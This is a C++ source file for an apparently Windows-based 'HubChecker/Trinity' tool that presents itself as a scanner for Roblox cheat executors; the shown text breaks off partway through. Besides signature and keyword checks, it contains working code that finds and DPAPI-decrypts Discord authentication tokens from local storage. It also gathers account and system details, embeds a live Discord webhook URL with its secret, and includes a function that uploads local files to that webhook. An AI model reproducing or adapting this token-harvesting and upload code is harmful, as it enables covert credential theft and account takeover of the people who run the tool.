// HubChecker_merged.cpp
// Merged from HubChecker (deep forensic scanner) + Trinity (Roblox/memory/network scanner)
#include "embedded_tools.h"
#define NOMINMAX        // prevent windows.h from defining min/max macros
#include <windows.h>
// tlhelp32.h MUST come before winternl.h — MSVC's winternl.h causes include-guard
// conflicts that silently drop PROCESSENTRY32A/Process32FirstA/Process32NextA.
#include <tlhelp32.h>
#include <winternl.h>
#include <winioctl.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>
#include <mscat.h>
// Trinity additions
#include <winhttp.h>
#include <psapi.h>
#include <bcrypt.h>
// Standard
#include <string>
#include <vector>
#include <iostream>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <map>
#include <set>
#include <functional>
#include <thread>
#include <mutex>
#include <atomic>
#include <regex>
#include <chrono>
#include <ctime>
#define _NTDEF_          // prevent ntsecapi.h from redefining UNICODE_STRING/STRING
#include <ntsecapi.h>
#include <sddl.h>        // ConvertStringSidToSidW for SID -> username resolution

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "version.lib")
// Trinity additions
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "bcrypt.lib")

// READ_USN_JOURNAL_DATA_V1 is absent from older MinGW winioctl.h builds.
// Guard with __MINGW32__ so MSVC (which already has it) is unaffected.
#ifdef __MINGW32__
#ifndef READ_USN_JOURNAL_DATA_V1
typedef struct {
    USN       StartUsn;
    DWORD     ReasonMask;
    DWORD     ReturnOnlyOnClose;
    LONGLONG  Timeout;
    LONGLONG  BytesToWaitFor;
    DWORDLONG UsnJournalID;
    WORD      MinMajorVersion;
    WORD      MaxMajorVersion;
} READ_USN_JOURNAL_DATA_V1, * PREAD_USN_JOURNAL_DATA_V1;
#endif
// READ_USN_JOURNAL_DATA_V0 is the 32-byte struct without the MinMajorVersion fields.
// Also absent from some older toolchain headers.
#ifndef READ_USN_JOURNAL_DATA_V0
typedef struct {
    USN       StartUsn;
    DWORD     ReasonMask;
    DWORD     ReturnOnlyOnClose;
    LONGLONG  Timeout;
    LONGLONG  BytesToWaitFor;
    DWORDLONG UsnJournalID;
} READ_USN_JOURNAL_DATA_V0, * PREAD_USN_JOURNAL_DATA_V0;
#endif
#endif


// DRIVER_ACTION_VERIFY is defined in softpub.h (already included above).
// It triggers the catalog-aware trust provider which resolves Windows system
// binaries signed via .cat files rather than embedded PE signatures.

using std::string; using std::wstring; using std::vector;

typedef NTSTATUS(NTAPI* pfnNtCreateFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef VOID(NTAPI* pfnRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

static pfnNtCreateFile         pNtCreateFile = nullptr;
static pfnRtlInitUnicodeString pRtlInitUnicodeString = nullptr;

static string Lower(string s) { std::transform(s.begin(), s.end(), s.begin(), ::tolower); return s; }
static vector<string> ScanFileForCheats(const string& path); // forward declaration
static string WtoS(const wchar_t* w); // forward declaration (defined below)

// Forward declarations for Trinity process helpers (defined later in file)
struct TrinityProcInfo { DWORD pid; string name; };
static vector<TrinityProcInfo> FindRobloxProcesses();

// Forward declarations for logging (defined later; needed by lambdas/helpers above)
static void Log(const string& msg);
static void LogFlush();

static void LoadNtDll() {
    HMODULE h = GetModuleHandleW(L"ntdll.dll");
    pNtCreateFile = (pfnNtCreateFile)GetProcAddress(h, "NtCreateFile");
    pRtlInitUnicodeString = (pfnRtlInitUnicodeString)GetProcAddress(h, "RtlInitUnicodeString");
}

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// =========================================================================
//  Keywords  (union of HubChecker forensic list + Trinity Roblox executor list)
// =========================================================================
// Forensic-specific (targeted, low false-positive):
static const vector<string> KW = {
    // HubChecker originals
    "xeno", "seliware", "clumsy",
    "wave", "awp", "bunni", "swift", "cryptic", "volcano",
    "potassium", "sirhurt", "solara", "cleaner",
    // Trinity executor names not already present
    "scriptware",
    "oxygen", "arceus", "hydroxide", "celery",
    "trigon", "comet", "electron", "vega",
    "macsploit", "evon", "codex",
    "executor", "inject", "robloxplayerexecutor",
    "dansploit", "coco", "proxo",
    "exploit", "cheat", "hack"
};

// ── Trinity: extended signature sets used for memory/process scanning ─────────
static const vector<string> EXECUTOR_API_STRINGS = {
    "hookfunction", "getrawmetatable", "newcclosure", "checkcaller",
    "getnamecallmethod", "setreadonly", "isexecutorclosure", "getgenv",
    "getrenv", "getsenv", "getinstances", "gethui", "decompile",
    "getscripts", "getloadedmodules", "firetouchinterest",
    "fireproximityprompt", "getcallingscript",
};

static const vector<string> LUA_BYTECODE_SIGS = {
    "LuaQ", "LuaR", "LuaS", "LuaT", "luaCxV8U8"
};

static const vector<string> SUSPICIOUS_URL_PREFIXES = {
    "https://pastebin.com", "https://hastebin.com",
    "https://raw.githubusercontent.com",
    // Only flag Discord CDN *attachments* — avatars/icons/banners are normal Discord traffic.
    // Attachments are the actual vector used to host/distribute cheat payloads.
    "https://cdn.discordapp.com/attachments/",
    "https://paste.ee",
    "https://ghostbin.com", "https://rentry.co",
    "https://raw.github.com", "https://gist.githubusercontent.com",
};

// Returns true if the URL points to a benign media file (image/video/gif).
// Checks both bare extensions and extensions before a query-string '?'.
static bool IsMediaUrl(const string& url) {
    static const vector<string> mediaExts = {
        ".gif", ".jpg", ".jpeg", ".png", ".webp", ".bmp", ".svg", ".ico",
        ".mp4", ".mov", ".avi", ".mkv", ".webm", ".mp3", ".ogg", ".wav"
    };
    // Strip query string for extension matching
    string path = url;
    size_t q = url.find('?');
    if (q != string::npos) path = url.substr(0, q);
    // Lowercase last segment
    string low = Lower(path);
    for (const auto& ext : mediaExts) {
        if (low.size() >= ext.size() &&
            low.compare(low.size() - ext.size(), ext.size(), ext) == 0)
            return true;
    }
    return false;
}

// ── Trinity: API / Discord config ─────────────────────────────────────────────
static const string TRINITY_API_URL = "https://hub-rho-ruby.vercel.app";
static const string TRINITY_DISCORD = "https://discord.gg/fjgYd3WVwD";
static const string TRINITY_WEBHOOK = "https://discord.com/api/webhooks/1480172317555560500/RHNbM_Z6LXHm5iu-83vWN-Wyyo_S8c3HeK0rMyUydB1lTb6jlgehfzaXqRzGwmIfMwWJ";
static const long long DISCORD_EPOCH = 1420070400000LL;

// =========================================================================
//  Signature Checking
// =========================================================================
// Used only when a keyword hit is already confirmed — provides extra context
// in the output (Signed / Not signed / Fake Signature / Cheat Signature).
// Signature status alone never causes a flag.

enum class SigStatus { Signed, NotSigned, Fake, Cheat };

static string GetSignerName(const wstring& path) {
    HCERTSTORE     hStore = nullptr;
    HCRYPTMSG      hMsg = nullptr;
    DWORD          dwEncoding = 0, dwContentType = 0, dwFormatType = 0;

    if (!CryptQueryObject(CERT_QUERY_OBJECT_FILE, path.c_str(),
        CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
        CERT_QUERY_FORMAT_FLAG_BINARY,
        0, &dwEncoding, &dwContentType, &dwFormatType,
        &hStore, &hMsg, nullptr))
        return "";

    DWORD signerInfoSize = 0;
    if (!CryptMsgGetParam(hMsg, CMSG_SIGNER_INFO_PARAM, 0, nullptr, &signerInfoSize)) {
        CryptMsgClose(hMsg); CertCloseStore(hStore, 0); return "";
    }
    vector<BYTE> signerInfoBuf(signerInfoSize);
    auto* pSignerInfo = reinterpret_cast<CMSG_SIGNER_INFO*>(signerInfoBuf.data());
    if (!CryptMsgGetParam(hMsg, CMSG_SIGNER_INFO_PARAM, 0, pSignerInfo, &signerInfoSize)) {
        CryptMsgClose(hMsg); CertCloseStore(hStore, 0); return "";
    }

    CERT_INFO certInfo = {};
    certInfo.Issuer = pSignerInfo->Issuer;
    certInfo.SerialNumber = pSignerInfo->SerialNumber;
    PCCERT_CONTEXT pCert = CertFindCertificateInStore(hStore,
        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
        0, CERT_FIND_SUBJECT_CERT, &certInfo, nullptr);

    string result;
    if (pCert) {
        char nameBuf[512] = {};
        CertGetNameStringA(pCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, nullptr, nameBuf, sizeof(nameBuf));
        result = nameBuf;
        CertFreeCertificateContext(pCert);
    }

    CryptMsgClose(hMsg);
    CertCloseStore(hStore, 0);
    return result;
}

static const char* CHEAT_PUBLISHERS[] = {
    nullptr
};

// Check whether a file is verified via the Windows catalog system (catalog-signed).
// Many Windows user-mode system binaries (cmd.exe, notepad.exe, dwm.exe, etc.)
// do NOT have embedded Authenticode signatures -- they are verified via .cat
// catalog files. DRIVER_ACTION_VERIFY only resolves kernel-mode catalog entries;
// for user-mode binaries we must use the CryptCAT API directly, which is what
// sigcheck.exe and Windows Explorer use internally.
static bool IsCatalogSigned(const wstring& path) {
    HANDLE hCatAdmin = nullptr;
    if (!CryptCATAdminAcquireContext(&hCatAdmin, nullptr, 0))
        return false;

    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        CryptCATAdminReleaseContext(hCatAdmin, 0);
        return false;
    }

    // Compute the catalog hash (SHA-1)
    DWORD hashLen = 0;
    CryptCATAdminCalcHashFromFileHandle(hFile, &hashLen, nullptr, 0);
    if (hashLen == 0) {
        CloseHandle(hFile);
        CryptCATAdminReleaseContext(hCatAdmin, 0);
        return false;
    }
    vector<BYTE> hash(hashLen);
    if (!CryptCATAdminCalcHashFromFileHandle(hFile, &hashLen, hash.data(), 0)) {
        CloseHandle(hFile);
        CryptCATAdminReleaseContext(hCatAdmin, 0);
        return false;
    }
    CloseHandle(hFile);

    // Search catalog database for a matching entry
    HANDLE hCatInfo = CryptCATAdminEnumCatalogFromHash(
        hCatAdmin, hash.data(), hashLen, 0, nullptr);
    if (!hCatInfo) {
        CryptCATAdminReleaseContext(hCatAdmin, 0);
        return false;
    }

    // Verify the catalog member via WinVerifyTrust
    bool verified = false;
    CATALOG_INFO catInfo = {};
    catInfo.cbStruct = sizeof(catInfo);
    if (CryptCATCatalogInfoFromContext(hCatInfo, &catInfo, 0)) {
        WINTRUST_CATALOG_INFO wtc = {};
        wtc.cbStruct = sizeof(wtc);
        wtc.pcwszCatalogFilePath = catInfo.wszCatalogFile;
        wtc.pbCalculatedFileHash = hash.data();
        wtc.cbCalculatedFileHash = hashLen;
        wtc.pcwszMemberFilePath = path.c_str();

        WINTRUST_DATA wtd = {};
        wtd.cbStruct = sizeof(wtd);
        wtd.dwUnionChoice = WTD_CHOICE_CATALOG;
        wtd.pCatalog = &wtc;
        wtd.dwUIChoice = WTD_UI_NONE;
        wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
        wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
        wtd.dwStateAction = WTD_STATEACTION_VERIFY;

        GUID action = WINTRUST_ACTION_GENERIC_VERIFY_V2;
        verified = (WinVerifyTrust(nullptr, &action, &wtd) == ERROR_SUCCESS);

        wtd.dwStateAction = WTD_STATEACTION_CLOSE;
        WinVerifyTrust(nullptr, &action, &wtd);
    }

    CryptCATAdminReleaseCatalogContext(hCatAdmin, hCatInfo, 0);
    CryptCATAdminReleaseContext(hCatAdmin, 0);
    return verified;
}
static SigStatus CheckSignature(const wstring& path, string* outSignerName = nullptr) {
    WINTRUST_FILE_INFO fileInfo = {};
    fileInfo.cbStruct = sizeof(fileInfo);
    fileInfo.pcwszFilePath = path.c_str();

    GUID policyGuid = WINTRUST_ACTION_GENERIC_VERIFY_V2;
    WINTRUST_DATA wtd = {};
    wtd.cbStruct = sizeof(wtd);
    wtd.dwUIChoice = WTD_UI_NONE;
    wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
    wtd.dwUnionChoice = WTD_CHOICE_FILE;
    wtd.pFile = &fileInfo;
    wtd.dwStateAction = WTD_STATEACTION_VERIFY;
    wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

    LONG lStatus = WinVerifyTrust(nullptr, &policyGuid, &wtd);

    wtd.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(nullptr, &policyGuid, &wtd);

    if (lStatus == ERROR_SUCCESS) {
        string signer = GetSignerName(path);
        if (outSignerName) *outSignerName = signer;
        string signerLow = Lower(signer);
        for (int i = 0; CHEAT_PUBLISHERS[i]; i++)
            if (signerLow.find(CHEAT_PUBLISHERS[i]) != string::npos)
                return SigStatus::Cheat;
        return SigStatus::Signed;
    }

    // Embedded PE signature check failed.
    // Before reporting as NotSigned/Fake, check if the file is catalog-signed
    // (common for Windows system binaries like cmd.exe, notepad.exe, etc.)
    string signer = GetSignerName(path);
    if (outSignerName) *outSignerName = signer;

    if (!signer.empty())
        return SigStatus::Fake;  // has an embedded cert but it failed verification

    // No embedded cert — check catalog
    if (IsCatalogSigned(path))
        return SigStatus::Signed;  // legitimately catalog-signed Windows binary

    return SigStatus::NotSigned;
}

static string SigStatusStr(SigStatus s) {
    switch (s) {
    case SigStatus::Signed:    return "Signed";
    case SigStatus::NotSigned: return "Not signed";
    case SigStatus::Fake:      return "Fake Signature";
    case SigStatus::Cheat:     return "Cheat Signature";
    }
    return "Unknown";
}

// =========================================================================
//  Trinity: WinHTTP layer
// =========================================================================
struct TUrlParts { wstring host, path; INTERNET_PORT port; bool https; };

static TUrlParts ParseTrinityUrl(const string& url) {
    TUrlParts p = {};
    wstring w(url.begin(), url.end());
    URL_COMPONENTSW uc = {};
    uc.dwStructSize = sizeof(uc);
    wchar_t host[512] = {}, urlpath[4096] = {};
    uc.lpszHostName = host;    uc.dwHostNameLength = 511;
    uc.lpszUrlPath = urlpath; uc.dwUrlPathLength = 4095;
    WinHttpCrackUrl(w.c_str(), 0, 0, &uc);
    p.host = host;
    p.path = urlpath;
    p.port = uc.nPort;
    p.https = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    return p;
}

static HINTERNET g_trinitySession = nullptr;
static std::once_flag g_trinitySessionFlag;
static HINTERNET GetTrinitySession() {
    std::call_once(g_trinitySessionFlag, []() {
        g_trinitySession = WinHttpOpen(L"HubTrinity/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        });
    return g_trinitySession;
}

static string TrinityHttpGet(const string& url) {
    auto p = ParseTrinityUrl(url);
    HINTERNET hConn = WinHttpConnect(GetTrinitySession(), p.host.c_str(), p.port, 0);
    if (!hConn) return "";
    DWORD flags = p.https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", p.path.c_str(), nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); return ""; }
    WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hReq, nullptr);
    string result; DWORD br = 0; char buf[8192];
    while (WinHttpReadData(hReq, buf, sizeof(buf), &br) && br > 0) result.append(buf, br);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
    return result;
}

// Fix 5: Returns HTTP status code and fills bodyOut — mirrors Python's
// requests.get() where both r.status_code and r.text are available.
// Used for PIN validation so we check 404/403/200 exactly like Python does.
static DWORD TrinityHttpGetWithStatus(const string& url, string& bodyOut) {
    auto p = ParseTrinityUrl(url);
    HINTERNET hConn = WinHttpConnect(GetTrinitySession(), p.host.c_str(), p.port, 0);
    if (!hConn) return 0;
    DWORD flags = p.https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", p.path.c_str(), nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); return 0; }
    WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hReq, nullptr);
    DWORD status = 0, statusSz = sizeof(status);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        nullptr, &status, &statusSz, nullptr);
    DWORD br = 0; char buf[8192];
    while (WinHttpReadData(hReq, buf, sizeof(buf), &br) && br > 0) bodyOut.append(buf, br);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
    return status;
}

static DWORD TrinityHttpPostJson(const string& url, const string& body) {
    auto p = ParseTrinityUrl(url);
    HINTERNET hConn = WinHttpConnect(GetTrinitySession(), p.host.c_str(), p.port, 0);
    if (!hConn) return 0;
    DWORD flags = p.https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", p.path.c_str(), nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); return 0; }
    wstring headers = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(hReq, headers.c_str(), (DWORD)-1L,
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    WinHttpReceiveResponse(hReq, nullptr);
    DWORD status = 0, statusSz = sizeof(status);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        nullptr, &status, &statusSz, nullptr);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
    return status;
}

static bool TrinityHttpPost(const string& url, const string& body) {
    DWORD s = TrinityHttpPostJson(url, body);
    return (s >= 200 && s < 300);
}

static bool TrinityHttpPostFile(const string& webhookUrl, const string& filePath) {
    // Multipart form-data upload to Discord webhook
    auto p = ParseTrinityUrl(webhookUrl);
    HINTERNET hConn = WinHttpConnect(GetTrinitySession(), p.host.c_str(), p.port, 0);
    if (!hConn) return false;
    DWORD flags = p.https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", p.path.c_str(), nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hConn); return false; }

    std::ifstream ifs(filePath, std::ios::binary);
    if (!ifs) { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); return false; }
    string fileData((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    ifs.close();

    string fname = filePath;
    size_t pos = fname.find_last_of("\\/");
    if (pos != string::npos) fname = fname.substr(pos + 1);

    string boundary = "----HubTrinityBoundary7MA4YWxk";
    string body;
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"" + fname + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body += fileData;
    body += "\r\n--" + boundary + "--\r\n";

    wstring hdrs = L"Content-Type: multipart/form-data; boundary=----HubTrinityBoundary7MA4YWxk\r\n";
    WinHttpSendRequest(hReq, hdrs.c_str(), (DWORD)-1L,
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    WinHttpReceiveResponse(hReq, nullptr);
    DWORD status = 0, statusSz = sizeof(status);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        nullptr, &status, &statusSz, nullptr);
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
    return (status == 200 || status == 204);
}

// =========================================================================
//  Trinity: System Info
// =========================================================================
struct SystemInfo {
    string hostname, username, osVersion, windowsInstallDate;
    vector<string> robloxAccounts, discordAccounts, robloxProfileUrls;
    vector<string> robloxCookieNotes; // browser cookie session indicators
};

static string TrinityGetWindowsInstallDate() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return "";
    char buildStr[32] = {}; DWORD sz = sizeof(buildStr);
    RegQueryValueExA(hKey, "CurrentBuildNumber", nullptr, nullptr, (LPBYTE)buildStr, &sz);
    DWORD val; sz = sizeof(val);
    string result;
    if (RegQueryValueExA(hKey, "InstallDate", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS) {
        time_t t = (time_t)val; struct tm tm_info; gmtime_s(&tm_info, &t);
        char buf[32]; strftime(buf, sizeof(buf), "%Y-%m-%d", &tm_info);
        result = buf;
    }
    RegCloseKey(hKey);
    return result;
}

static string TrinityFiletimeToString(ULONGLONG ft) {
    if (ft == 0) return "unknown";
    ULONGLONG epoch = (ft - 116444736000000000ULL) / 10000000ULL;
    time_t t = (time_t)epoch; struct tm tm_info; gmtime_s(&tm_info, &t);
    char buf[64]; strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tm_info);
    return string(buf);
}

static string TrinityNowString() {
    SYSTEMTIME st; GetLocalTime(&st);
    char buf[64];
    snprintf(buf, sizeof(buf), "%04d-%02d-%02dT%02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return string(buf);
}

// =========================================================================
//  Discord token helpers
// =========================================================================

// Base64url → standard base64, then decode via Windows CryptStringToBinaryA.
// Returns decoded bytes, or empty string on failure.
static string Base64UrlDecode(const string& input) {
    // Convert base64url alphabet to standard base64
    string b64 = input;
    for (char& c : b64) {
        if (c == '-') c = '+';
        else if (c == '_') c = '/';
    }
    // Pad to a multiple of 4
    while (b64.size() % 4) b64 += '=';

    DWORD outLen = 0;
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
        CRYPT_STRING_BASE64, nullptr, &outLen, nullptr, nullptr) || outLen == 0)
        return "";
    string out(outLen, '\0');
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
        CRYPT_STRING_BASE64, (BYTE*)&out[0], &outLen, nullptr, nullptr))
        return "";
    out.resize(outLen);
    return out;
}

// Given a raw Discord token string, decode the user ID from the first segment.
// Normal tokens:  <base64url(user_id)>.<timestamp>.<hmac>
// MFA tokens:     mfa.<opaque_string>  — no user ID encoded, returns ""
// Returns the numeric user ID string, or "" if it cannot be decoded.
static string DecodeDiscordTokenUserId(const string& token) {
    if (token.substr(0, 4) == "mfa.") return ""; // MFA tokens have no embedded ID

    size_t dot = token.find('.');
    if (dot == string::npos) return "";
    string segment = token.substr(0, dot);
    string decoded = Base64UrlDecode(segment);
    if (decoded.empty()) return "";

    // Decoded bytes should be a printable ASCII numeric string (the user ID)
    for (char c : decoded) if (!isdigit((unsigned char)c)) return "";
    if (decoded.size() < 6 || decoded.size() > 21) return "";
    return decoded;
}

// Decrypts a DPAPI-protected Discord token blob.
// Discord desktop app (since ~2020) encrypts stored tokens as:
//   base64( DPAPI_blob )   — with a "dQw4w9WgXcQ:" prefix stripped first
// Returns the plaintext token string or "" on failure.
static string DecryptDiscordDpapiToken(const string& encryptedB64) {
    // Base64-decode
    DWORD outLen = 0;
    if (!CryptStringToBinaryA(encryptedB64.c_str(), (DWORD)encryptedB64.size(),
        CRYPT_STRING_BASE64, nullptr, &outLen, nullptr, nullptr) || outLen == 0)
        return "";
    vector<BYTE> blob(outLen);
    if (!CryptStringToBinaryA(encryptedB64.c_str(), (DWORD)encryptedB64.size(),
        CRYPT_STRING_BASE64, blob.data(), &outLen, nullptr, nullptr))
        return "";
    blob.resize(outLen);

    DATA_BLOB inBlob = { (DWORD)blob.size(), blob.data() };
    DATA_BLOB outBlob = {};
    if (!CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob))
        return "";
    string tok(reinterpret_cast<char*>(outBlob.pbData), outBlob.cbData);
    LocalFree(outBlob.pbData);
    return tok;
}

// Scans all .ldb and .log files in a LevelDB directory for Discord auth tokens.
// Handles three storage formats:
//   1. Plaintext token (old Discord versions)
//   2. dQw4w9WgXcQ:<base64(DPAPI blob)>  (Discord desktop app, current)
//   3. v10/v11 AES-GCM blob (Discord in Chromium browser — handled in cookie scanner)
// Returns a list of (token, decoded_user_id) pairs.
// MFA tokens that cannot yield a user ID return ("mfa.xxx...", "").
static vector<std::pair<string, string>> ScanLevelDbForDiscordTokens(const string& ldbDir) {
    vector<std::pair<string, string>> results;
    std::set<string> seenTokens;

    // Plaintext token regex
    static const std::regex tokenRx(
        "(mfa\\.[A-Za-z0-9_\\-]{20,}"
        "|[A-Za-z0-9_\\-]{23,28}\\.[A-Za-z0-9_\\-]{6}\\.[A-Za-z0-9_\\-]{27,})"
    );
    // DPAPI-encrypted token marker used by Discord desktop app
    // Format in LevelDB value: dQw4w9WgXcQ:<base64url-encoded DPAPI blob>
    static const string DPAPI_PREFIX = "dQw4w9WgXcQ:";

    auto pushToken = [&](const string& tok) {
        if (!seenTokens.insert(tok).second) return;
        string uid = DecodeDiscordTokenUserId(tok);
        results.push_back({ tok, uid });
        };

    for (const char* ext : { ".ldb", ".log" }) {
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA((ldbDir + "\\*" + ext).c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            ULONGLONG fsz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            if (fsz == 0 || fsz > 32ULL * 1024 * 1024) continue;
            HANDLE hf = CreateFileA((ldbDir + "\\" + fd.cFileName).c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hf == INVALID_HANDLE_VALUE) continue;
            string data((size_t)fsz, '\0');
            DWORD rd = 0;
            ReadFile(hf, &data[0], (DWORD)fsz, &rd, nullptr);
            CloseHandle(hf);
            data.resize(rd);
            for (char& c : data) if (c == '\0') c = ' ';

            // ── Format 1: plaintext token ─────────────────────────────────────
            for (auto it = std::sregex_iterator(data.begin(), data.end(), tokenRx);
                it != std::sregex_iterator(); ++it)
                pushToken((*it)[1].str());

            // ── Format 2: dQw4w9WgXcQ: DPAPI-encrypted token ─────────────────
            // Discord desktop app stores tokens as:
            //   key:   https://discord.com\x00\x01<some_key>
            //   value: dQw4w9WgXcQ:<base64(DPAPI encrypted token)>
            size_t pos = 0;
            while ((pos = data.find(DPAPI_PREFIX, pos)) != string::npos) {
                pos += DPAPI_PREFIX.size();
                // Extract the base64 blob — ends at whitespace or non-base64 chars
                size_t end = pos;
                while (end < data.size()) {
                    char c = data[end];
                    if (isalnum((unsigned char)c) || c == '+' || c == '/' ||
                        c == '=' || c == '-' || c == '_')
                        ++end;
                    else break;
                }
                if (end <= pos + 20) continue; // too short to be a real token blob
                string b64 = data.substr(pos, end - pos);
                // Convert base64url to standard base64 before DPAPI decrypt
                for (char& c : b64) {
                    if (c == '-') c = '+';
                    else if (c == '_') c = '/';
                }
                string decrypted = DecryptDiscordDpapiToken(b64);
                if (decrypted.empty()) continue;
                // Validate that what we decrypted looks like a token
                std::smatch m;
                if (std::regex_search(decrypted, m, tokenRx))
                    pushToken(m[1].str());
            }
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    return results;
}

// ── LevelDB forensic scanner ──────────────────────────────────────────────────
//
// LevelDB stores data in two file types:
//   .log  = Write-ahead log (WAL). 32 KB physical blocks. Each block contains
//           one or more records: [CRC32 4B][len 2B LE][type 1B][data].
//           Batch data inside a record: [seq 8B][count 4B LE] then count×
//           [tag 1B][keyLen varint][key][valLen varint][value].
//
//   .ldb  = SSTable. Data blocks contain key-value pairs with shared-prefix
//           compression: [shared varint][non_shared varint][val_len varint]
//           [key_delta non_shared bytes][value val_len bytes].
//           Restart array at end of each block lets us reset shared prefix.
//           Footer (48 B) + metaindex/index blocks follow the data blocks.
//
// The old approach replaced nulls with spaces and ran regex over the raw bytes.
// That breaks on varint length prefixes that happen to contain digit characters,
// causing false negatives (match split across a length byte) and false positives.
//
// This implementation properly decodes both formats and collects all key+value
// strings, then runs the regex only over clean UTF-8 text.

// Read a varint from buf[pos], advance pos, return value. Returns 0 on error.
static uint64_t ReadVarint(const string& buf, size_t& pos) {
    uint64_t result = 0; int shift = 0;
    while (pos < buf.size()) {
        uint8_t b = (uint8_t)buf[pos++];
        result |= (uint64_t)(b & 0x7F) << shift;
        if (!(b & 0x80)) return result;
        shift += 7;
        if (shift >= 64) return 0;
    }
    return 0;
}

// Extract all key+value strings from one LevelDB WAL (.log) file.
static void ParseLevelDbLog(const string& data, vector<string>& out) {
    static const size_t BLOCK = 32768;
    size_t pos = 0;
    while (pos + 7 <= data.size()) {
        // Align to block boundary if we've crossed one
        size_t blockOff = pos % BLOCK;
        if (blockOff + 7 > BLOCK) { pos += BLOCK - blockOff; continue; }

        // Physical record header: CRC(4) + len(2 LE) + type(1)
        uint16_t recLen = (uint8_t)data[pos + 4] | ((uint8_t)data[pos + 5] << 8);
        uint8_t  recType = (uint8_t)data[pos + 6];
        pos += 7;
        if (recLen == 0 || pos + recLen > data.size()) { pos++; continue; }
        // type 0=zero(padding), 1=full, 2=first, 3=middle, 4=last
        if (recType == 0) { pos += recLen; continue; }

